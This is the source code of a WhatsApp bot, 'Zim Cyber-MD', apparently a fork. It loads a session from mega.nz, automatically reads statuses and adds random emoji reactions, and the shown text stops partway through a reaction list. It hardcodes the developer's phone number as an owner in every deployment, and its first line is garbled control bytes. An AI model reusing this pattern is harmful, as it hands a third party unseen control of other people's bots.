02%05%0DA/%1B%15(CC%18%13%03%1A%13%18%05J&%03%25)NC@3%0A2#FOA%0C%0E%25&NGM/**


 Copyright (C) 2025.
 Licensed under the  GPL-3.0 License;
 You may not sell this script.
 It is supplied in the hope that it may be useful.
 * @project_name : Free Bot script
 * @author : Malvin King <https://github.com/kingmalvn>
 * @description : A Multi-functional whatsapp bot script.
 * @version 3.0.0
 **/


const {
default: makeWASocket,
useMultiFileAuthState,
DisconnectReason,
jidNormalizedUser,
getContentType,
fetchLatestBaileysVersion,
Browsers
} = require('@whiskeysockets/baileys')


const l = console.log
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
const fs = require('fs')
const ff = require('fluent-ffmpeg')
const P = require('pino')
const config = require('./config')
const rankCommand = require('./plugins/rank')
const qrcode = require('qrcode-terminal')
const StickersTypes = require('wa-sticker-formatter')
const util = require('util')
const { sms,downloadMediaMessage } = require('./lib/msg')
const axios = require('axios')
const { File } = require('megajs')
const { fromBuffer } = require('file-type')
const bodyparser = require('body-parser')
const { tmpdir } = require('os')
const Crypto = require('crypto')
const path = require('path')
const prefix = config.PREFIX

const ownerNumber = ['263771341158']

//===================SESSION-AUTH============================
if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
if(!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!')
const sessdata = config.SESSION_ID.replace("Suhail", '');
const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
filer.download((err, data) => {
if(err) throw err
fs.writeFile(__dirname + '/sessions/creds.json', data, () => {
console.log("SESSION DOWNLOADED COMPLETED ✅")
})})}

const express = require("express");
const app = express();
const port = process.env.PORT || 9090;


async function connectToWA() {
console.log("CONNECTING Zim Cyber-MD 🧬...");
const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
var { version } = await fetchLatestBaileysVersion()

const conn = makeWASocket({
        logger: P({ level: 'silent' }),
        printQRInTerminal: false,
        browser: Browsers.macOS("Firefox"),
        syncFullHistory: true,
        auth: state,
        version
        })
    
conn.ev.on('connection.update', (update) => {
const { connection, lastDisconnect } = update
if (connection === 'close') {
if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
connectToWA()
}
} else if (connection === 'open') {
console.log('♻️ INSTALLING PLUGINS FILES PLEASE WAIT... 🪄')
const path = require('path');
fs.readdirSync("./plugins/").forEach((plugin) => {
if (path.extname(plugin).toLowerCase() == ".js") {
require("./plugins/" + plugin);
}
});
console.log('PLUGINS FILES INSTALL SUCCESSFULLY ✅')
console.log('Zim Cyber-MD CONNECTED TO WHATSAPP ENJOY ✅')

let up = `*╭──────────────●●►*
> *➺ Zim Cyber-MD ᴄᴏɴɴᴇᴄᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʏ ᴛʏᴘᴇ .ᴍᴇɴᴜ ᴛᴏ ᴄᴏᴍᴍᴀɴᴅ ʟɪsᴛ ᴄʀᴇᴀᴛᴇᴅ ʙʏ mr shellah ✅*

> *❁ᴊᴏɪɴ ᴏᴜʀ ᴡʜᴀᴛsᴀᴘᴘ ᴄʜᴀɴɴᴇʟ ғᴏʀ ᴜᴘᴅᴀᴛᴇs 

*https://whatsapp.com/channel/0029Vb5SP7IDjiOfSjLKlB2Y*

*YOUR BOT ACTIVE NOW ENJOY♥️🪄*\n\n*PREFIX: ${prefix}*

*╰──────────────●●►*`;
conn.sendMessage(conn.user.id, { image: { url: config.MENU_IMG }, caption: up })

}
})
conn.ev.on('creds.update', saveCreds)  
        
//=============readstatus=======

conn.ev.on('messages.upsert', async(mek) => {
mek = mek.messages[0]
if (!mek.message) return	
mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_READ_STATUS === "true"){
await conn.readMessages([mek.key])
}
const m = sms(conn, mek)
const type = getContentType(mek.message)
const content = JSON.stringify(mek.message)
const from = mek.key.remoteJid
const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const q = args.join(' ')
const isGroup = from.endsWith('@g.us')
const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
const senderNumber = sender.split('@')[0]
const botNumber = conn.user.id.split(':')[0]
const pushname = mek.pushName || 'Sin Nombre'
const isMe = botNumber.includes(senderNumber)
const isOwner = ownerNumber.includes(senderNumber) || isMe
const botNumber2 = await jidNormalizedUser(conn.user.id);
const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const isReact = m.message.reactionMessage ? true : false
const reply = (teks) => {
conn.sendMessage(from, { text: teks }, { quoted: mek })
}
        
conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
              let mime = '';
              let res = await axios.head(url)
              mime = res.headers['content-type']
              if (mime.split("/")[1] === "gif") {
                return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
              }
              let type = mime.split("/")[0] + "Message"
              if (mime === "application/pdf") {
                return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
              }
              if (mime.split("/")[0] === "image") {
                return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
              }
              if (mime.split("/")[0] === "video") {
                return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
              }
              if (mime.split("/")[0] === "audio") {
                return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
              }
            }
        
//================ownerreact==============
if(senderNumber.includes("26377777777")){
if(isReact) return
m.react("👑")
}
if(senderNumber.includes("263777777777")){
if(isReact) return
m.react("👑")
}
if(senderNumber.includes("263771341158")){
if(isReact) return
m.react("🦋")
   }

if(senderNumber.includes("263771341158")){
if(isReact) return
m.react("🎀")
   }

//==========================public react===============//
// Auto React 
if (!isReact && senderNumber !== botNumber) {
    if (config.AUTO_REACT === 'true') {
        const reactions = ['😊', '👍', '😂', '💯', '🔥', '🙏', '🎉', '👏', '😎', '🤖', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '🙂', '😑', '🤣', '😍', '😘', '😗', '😙', '😚', '😛', '😝', '😞', '😟', '😠', '😡', '😢', '😭', '😓', '😳', '😴', '😌', '😆', '😂', '🤔', '😒', '😓', '😶', '🙄', '🐶', '🐱', '🐔', '🐷', '🐴', '🐲', '🐸', '🐳', '🐋', '🐒', '🐑', '🐕', '🐩', '🍔', '🍕', '🥤', '🍣', '🍲', '🍴', '🍽', '🍹', '🍸', '🎂', '📱', '📺', '📻', '🎤', '📚', '💻', '📸', '📷', '❤️', '💔', '❣️', '☀️', '🌙', '🌃', '🏠', '🚪', "🇺🇸", "🇬🇧", "🇨🇦", "🇦🇺", "🇯🇵", "🇫🇷", "🇪🇸", '👍', '👎', '👏', '👫', '👭', '👬', '👮', '🤝', '🙏', '👑', '🌻', '🌺', '🌸', '🌹', '🌴', "🏞️", '🌊', '🚗', '🚌', "🛣️", "🛫️", "🛬️", '🚣', '🛥', '🚂', '🚁', '🚀', "🏃‍♂️", "🏋️‍♀️", "🏊‍♂️", "🏄‍♂️", '🎾', '🏀', '🏈', '🎯', '🏆', '??', '⬆️', '⬇️', '⇒', '⇐', '↩️', '↪️', 'ℹ️', '‼️', '⁉️', '‽️', '©️', '®️', '™️', '🔴', '🔵', '🟢', '🔹', '🔺', '💯', '👑', '🤣', "🤷‍♂️", "🤷‍♀️", "🙅‍♂️", "🙅‍♀️", "🙆‍♂️", "🙆‍♀️", "🤦‍♂️", "🤦‍♀️", '🏻', '💆‍♂️', "💆‍♀️", "🕴‍♂️", "🕴‍♀️", "💇‍♂️", "💇‍♀️", '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '�', '🏯', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🌳', '🌲', '🌾', '🌿', '🍃', '🍂', '🍃', '🌻', '💐', '🌹', '🌺', '🌸', '🌴', '🏵', '🎀', '🏆', '🏈', '🏉', '🎯', '🏀', '🏊', '🏋', '🏌', '🎲', '📚', '📖', '📜', '📝', '💭', '💬', '🗣', '💫', '🌟', '🌠', '🎉', '🎊', '👏', '💥', '🔥', '💥', '🌪', '💨', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌱', '🌿', '🍃', '🍂', '🌻', '💐', '🌹', '🌺', '🌸', '🌴', '🏵', '🎀', '🏆', '🏈', '🏉', '🎯', '🏀', '🏊', '🏋', '🏌', '🎲', '📚', '📖', '📜', '📝', '💭', '💬', '🗣', '💫', '🌟', '🌠', '🎉', '🎊', '👏', '💥', '🔥', '💥', '🌪', '💨', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🐒', '🦍', '🦧', '🐶', '🐕', '🦮', "🐕‍🦺", '🐩', '🐺', '🦊', '🦝', '🐱', '🐈', "🐈‍⬛", '🦁', '🐯', '🐅', '🐆', '🐴', '🐎', '🦄', '🦓', '🦌', '🦬', '🐮', '🐂', '🐃', '🐄', '🐷', '🐖', '🐗', '🐽', '🐏', '🐑', '🐐', '🐪', '🐫', '🦙', '🦒', '🐘', '🦣', '🦏', '🦛', '🐭', '🐁', '🐀', '🐹', '🐰', '🐇', "🐿️", '🦫', '🦔', '🦇', '🐻', "🐻‍❄️", '🐨', '🐼', '🦥', '🦦', '🦨', '🦘', '🦡', '🐾', '🦃', '🐔', '🐓', '🐣', '🐤', '🐥', '🐦', '🐧', "🕊️", '🦅', '🦆', '🦢', '🦉', '🦤', '🪶', '🦩', '🦚', '🦜', '🐸', '🐊', '🐢', '🦎', '🐍', '🐲', '🐉', '🦕', '🦖', '🐳', '🐋', '🐬', '🦭', '🐟', '🐠', '😀', '😃', '😄', '😁', '😆', '😅', '🤣', '😂', '🙂', '🙃', '😉', '😊', '😇', '🥰', '😍', '🤩', '😘', '😗', '☺️', '😚', '😙', '🥲', '😋', '😛', '😜', '🤪', '😝', '🤑', '🤗', '🤭', '🤫', '🤔', '🤐', '🤨', '😐', '😑', '😶', "😶‍🌫️", '😏', '😒', '🙄', '😬', "😮‍💨", '🤥', '😌', '😔', '😪', '🤤', '😴', '😷', '🤒', '🤕', '🤢', '🤮', '🤧', '🥵', '🥶', '🥴', '😵', "😵‍💫", '🤯', '🤠', '🥳', '🥸', '😎', '🤓', '🧐', '😕', '😟', '🙁', '☹️', '😮', '😯', '😲', '😳', '🥺', '😦', '😧', '😨', '😰', '😥', '😢', '😭', '😱', '😖', '😣', '😞', '😓', '😩', '😫', '🥱', '😤', '😡', '😠', '🤬', '😈', '👿', '💀', '☠️', '💩', '🤡', '👹', '👺', '👻', '👽', '👾', '🤖', '😺', '😸', '😹', '😻', '😼', '😽', '🙀', '😿', '😾', '🙈', '🙉', '🙊', '💋', '💌', '💘', '💝', '💖', '💗', '💓', '💞', '💕', '💟', '❣️', '💔', "❤️‍🔥", "❤️‍🩹", '❤️', '🧡', '💛', '💚', '💙', '💜', '🤎', '🖤', '🤍', '💯', '💢', '💥', '💫', '💦', '💨', "🕳️", '💣', '💬', "👁️‍🗨️", "🗨️", "🗯️", '💭', '💤', '👋', '🤚', "🖐️", '✋', '🖖', '👌', '🤌', '🤏', '✌️', '🤞', '🤟', '🤘', '🤙', '👈', '👉', '👆', '🖕', '👇', '☝️', '👍', '👎', '✊', '👊', '🤛', '🤜', '👏', '🙌', '👐', '🤲', '🤝', '🙏', '✍️', '💅', '🤳', '💪', '🦾', '🦿', '🦵', '🦶', '👂', '🦻', '👃', '🧠', '🫀', '🫁', '🦷', '🦴', '👀', "👁️", '👅', '👄', '👶', '🧒', '👦', '👧', '🧑', '👱', '👨', '🧔', "🧔‍♂️", "🧔‍♀️", "👨‍🦰", "👨‍🦱", "👨‍🦳", "👨‍🦲", '👩', "👩‍🦰", "🧑‍🦰", "👩‍🦱", "🧑‍🦱", "👩‍🦳", "🧑‍🦳", "👩‍🦲", "🧑‍🦲", "👱‍♀️", "👱‍♂️", '🧓', '👴', '👵', '🙍', "🙍‍♂️", "🙍‍♀️", '🙎', "🙎‍♂️", "🙎‍♀️", '🙅', "🙅‍♂️", "🙅‍♀️", '🙆', "🙆‍♂️", "🙆‍♀️", '💁', "💁‍♂️", "💁‍♀️", '🙋', "🙋‍♂️", "🙋‍♀️", '🧏', "🧏‍♂️", "🧏‍♀️", '🙇', "🙇‍♂️", "🙇‍♀️", '🤦', "🤦‍♂️", "🤦‍♀️", '🤷', "🤷‍♂️", "🤷‍♀️", "🧑‍⚕️", "👨‍⚕️", "👩‍⚕️", "🧑‍🎓", "👨‍🎓", "👩‍🎓", "🧑‍🏫", '👨‍🏫', "👩‍🏫", "🧑‍⚖️", "👨‍⚖️", "👩‍⚖️", "🧑‍🌾", "👨‍🌾", "👩‍🌾", "🧑‍🍳", "👨‍🍳", "👩‍🍳", "🧑‍🔧", "👨‍🔧", "👩‍🔧", "🧑‍🏭", "👨‍🏭", "👩‍🏭", "🧑‍💼", "👨‍💼", "👩‍💼", "🧑‍🔬", "👨‍🔬", "👩‍🔬", "🧑‍💻", "👨‍💻", "👩‍💻", "🧑‍🎤", "👨‍🎤", "👩‍🎤", "🧑‍🎨", "👨‍🎨", "👩‍🎨", "🧑‍✈️", "👨‍✈️", "👩‍✈️", "🧑‍🚀", "👨‍🚀", "👩‍🚀", "🧑‍🚒", "👨‍🚒", "👩‍🚒", '👮', "👮‍♂️", "👮‍♀️", "🕵️", "🕵️‍♂️", "🕵️‍♀️", '💂', "💂‍♂️", "💂‍♀️", '🥷', '👷', "👷‍♂️", "👷‍♀️", '🤴', '👸', '👳', "👳‍♂️", "👳‍♀️", '👲', '🧕', '🤵', "🤵‍♂️", "🤵‍♀️", '👰', "👰‍♂️", "👰‍♀️", '🤰', '🤱', "👩‍🍼", "👨‍🍼", "🧑‍🍼", '👼', '🎅', '🤶', "🧑‍🎄", '🦸', "🦸‍♂️", "🦸‍♀️", '🦹', "🦹‍♂️", "🦹‍♀️", '🧙', "🧙‍♂️", "🧙‍♀️", '🧚', "🧚‍♂️", "🧚‍♀️", '🧛', "🧛‍♂️", "🧛‍♀️", '🧜', "🧜‍♂️", "🧜‍♀️", '🧝', "🧝‍♂️", "🧝‍♀️", '🧞', "🧞‍♂️", "🧞‍♀️", '🧟', "🧟‍♂️", "🧟‍♀️", '💆', "💆‍♂️", "💆‍♀️", '💇', "💇‍♂️", "💇‍♀️", '🚶', "🚶‍♂️", "🚶‍♀️", '🧍', "🧍‍♂️", "🧍‍♀️", '🧎', "🧎‍♂️", "🧎‍♀️", "🧑‍🦯", "👨‍🦯", "👩‍🦯", "🧑‍🦼", "👨‍🦼", "👩‍🦼", "🧑‍🦽", "👨‍🦽", "👩‍🦽", '🏃', "🏃‍♂️", "🏃‍♀️", '💃', '🕺', "🕴️", '👯', "👯‍♂️", "👯‍♀️", '🧖', "🧖‍♂️", "🧖‍♀️", '🧗', "🧗‍♂️", "🧗‍♀️", '🤺', '🏇', '⛷️', '🏂', "🏌️", "🏌️‍♂️", "🏌️‍♀️", '🏄', "🏄‍♂️", "🏄‍♀️", '🚣', "🚣‍♂️", "🚣‍♀️", '🏊', "🏊‍♂️", "🏊‍♀️", '⛹️', "⛹️‍♂️", "⛹️‍♀️", "🏋️", "🏋️‍♂️", "🏋️‍♀️", '🚴', "🚴‍♂️", '🚴‍♀️', '🚵', "🚵‍♂️", "🚵‍♀️", '🤸', "🤸‍♂️", "🤸‍♀️", '🤼', "🤼‍♂️", "🤼‍♀️", '🤽', "🤽‍♂️", "🤽‍♀️", '🤾', "🤾‍♂️", "🤾‍♀️", '🤹', "🤹‍♂️", "🤹‍♀️", '🧘', "🧘‍♂️", "🧘‍♀️", '🛀', '🛌', "🧑‍🤝‍🧑", '👭', '👫', '👬', '💏', "👩‍❤️‍💋‍👨", "👨‍❤️‍💋‍👨", "👩‍❤️‍💋‍👩", '💑', "👩‍❤️‍👨", "👨‍❤️‍👨", "👩‍❤️‍👩", '👪', "👨‍👩‍👦", "👨‍👩‍👧", "👨‍👩‍👧‍👦", "👨‍👩‍👦‍👦", "👨‍👩‍👧‍👧", "👨‍👨‍👦", '👨‍👨‍👧', "👨‍👨‍👧‍👦", "👨‍👨‍👦‍👦", "👨‍👨‍👧‍👧", "👩‍👩‍👦", "👩‍👩‍👧", "👩‍👩‍👧‍👦", "👩‍👩‍👦‍👦", "👩‍👩‍👧‍👧", "👨‍👦", "👨‍👦‍👦", "👨‍👧", "👨‍👧‍👦", "👨‍👧‍👧", "👩‍👦", "👩‍👦‍👦", "👩‍👧", "👩‍👧‍👦", "👩‍👧‍👧", "🗣️", '👤', '👥', '🫂', '👣', '🦰', '🦱', '🦳', '🦲', '🐵'];

        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]; // 
        m.react(randomReaction);
    }
}

// Owner React
if (!isReact && senderNumber === botNumber) {
    if (config.OWNER_REACT === 'true') {
        const reactions = ['😊', '👍', '😂', '💯', '🔥', '🙏', '🎉', '👏', '😎', '🤖', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '🙂', '😑', '🤣', '😍', '😘', '😗', '😙', '😚', '😛', '😝', '😞', '😟', '😠', '😡', '😢', '😭', '😓', '😳', '😴', '😌', '😆', '😂', '🤔', '😒', '😓', '😶', '🙄', '🐶', '🐱', '🐔', '🐷', '🐴', '🐲', '🐸', '🐳', '🐋', '🐒', '🐑', '🐕', '🐩', '🍔', '🍕', '🥤', '🍣', '🍲', '🍴', '🍽', '🍹', '🍸', '🎂', '📱', '📺', '📻', '🎤', '📚', '💻', '📸', '📷', '❤️', '💔', '❣️', '☀️', '🌙', '🌃', '🏠', '🚪', "🇺🇸", "🇬🇧", "🇨🇦", "🇦🇺", "🇯🇵", "🇫🇷", "🇪🇸", '👍', '👎', '👏', '👫', '👭', '👬', '👮', '🤝', '🙏', '👑', '🌻', '🌺', '🌸', '🌹', '🌴', "🏞️", '🌊', '🚗', '🚌', "🛣️", "🛫️", "🛬️", '🚣', '🛥', '🚂', '🚁', '🚀', "🏃‍♂️", "🏋️‍♀️", "🏊‍♂️", "🏄‍♂️", '🎾', '🏀', '🏈', '🎯', '🏆', '??', '⬆️', '⬇️', '⇒', '⇐', '↩️', '↪️', 